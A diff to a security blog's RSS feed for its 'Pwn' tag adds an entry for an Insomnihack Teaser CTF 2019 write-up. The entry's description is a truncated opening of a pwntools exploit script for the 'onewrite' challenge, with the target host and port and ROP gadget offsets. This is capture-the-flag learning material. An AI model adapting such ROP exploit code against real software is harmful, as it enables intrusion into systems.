@@ -6,10 +6,19 @@
     <description>Recent content in Pwn on Protego Totalum Security</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Tue, 01 Jan 2019 13:34:45 +0700</lastBuildDate>
+    <lastBuildDate>Sun, 20 Jan 2019 19:21:38 -0500</lastBuildDate>
     
 	<atom:link href="https://protegototalum.faith/tags/pwn/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>Insomnihack Teaser CTF 2019</title>
+      <link>https://protegototalum.faith/post/insomnihack-teaser-ctf-2019/</link>
+      <pubDate>Sun, 20 Jan 2019 19:21:38 -0500</pubDate>
+      
+      <guid>https://protegototalum.faith/post/insomnihack-teaser-ctf-2019/</guid>
+      <description>Onewrite - Pwn from __future__ import print_function from pwn import * import os GDBSCRIPT = &amp;quot;&amp;quot;&amp;quot; &amp;quot;&amp;quot;&amp;quot; HOST = &#39;onewrite.teaser.insomnihack.ch&#39; PORT = 1337 BIN = &#39;./onewrite&#39; PROMPT = &amp;quot;&amp;gt; &amp;quot; STACK = &amp;quot;1&amp;quot; PIE = &amp;quot;2&amp;quot; ADDR = &amp;quot;address : &amp;quot; DATA = &amp;quot;data : &amp;quot; e = ELF(BIN) addrs = { &#39;poprax&#39;: 0x460ac, &#39;poprdxrsi&#39;: 0x484e9, &#39;poprdi&#39;: 0x84fa, &#39;syscall&#39;: 0x6e605, &#39;poprsp&#39;: 0x946a } if os.environ.has_key(&#39;remote&#39;): r = remote(HOST, PORT) else: r = process(e.</description>
+    </item>
     
     <item>
       <title>TetCTF 19</title>
